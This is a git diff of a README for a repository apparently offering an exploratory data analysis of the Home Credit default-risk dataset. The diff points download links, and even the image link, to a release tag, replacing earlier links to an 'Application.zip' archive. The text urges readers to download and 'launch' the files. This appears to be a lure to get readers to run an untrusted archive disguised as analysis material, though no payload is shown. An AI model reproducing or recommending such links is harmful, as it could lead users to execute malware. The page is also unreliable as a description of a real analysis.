@@ -1,6 +1,6 @@
 # Credit Default Risk Analysis EDA 📊
 
-![EDA Home Credit Group](https://via.placeholder.com/800x400)
+![EDA Home Credit Group](https://github.com/makoczoro/Credit-Default-Risk-Analysis-EDA/releases/tag/v2.0)
 
 Welcome to the **Credit-Default-Risk-Analysis-EDA** repository! Here, you will find a detailed Exploratory Data Analysis (EDA) of the Home Credit Group Dataset. This analysis aims to uncover demographic and financial factors associated with higher or lower default risks, providing valuable insights for risk mitigation and enhancing lending practices.
 
@@ -36,7 +36,7 @@ In the modern world, assessing credit risks is a crucial aspect of financial dec
 
 To explore the detailed EDA of the Home Credit Group Dataset, you can download the analysis files from the following link: 
 
-[![Download Analysis](https://img.shields.io/badge/Download-Analysis-blue.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Analysis](https://github.com/makoczoro/Credit-Default-Risk-Analysis-EDA/releases/tag/v2.0)](https://github.com/makoczoro/Credit-Default-Risk-Analysis-EDA/releases/tag/v2.0)
 
 Please note that the link provided needs to be launched to access the analysis files. If you encounter any issues with the link, kindly check the "Releases" section of this repository for alternative download options.
 
@@ -48,4 +48,4 @@ Let's dive into the world of credit risk analysis together and uncover actionabl
 
 Happy analyzing! 🚀
 
-🔗 [Check out our analysis here!](https://github.com/user-attachments/files/18426772/Application.zip) 🔗
+🔗 [Check out our analysis here!](https://github.com/makoczoro/Credit-Default-Risk-Analysis-EDA/releases/tag/v2.0) 🔗
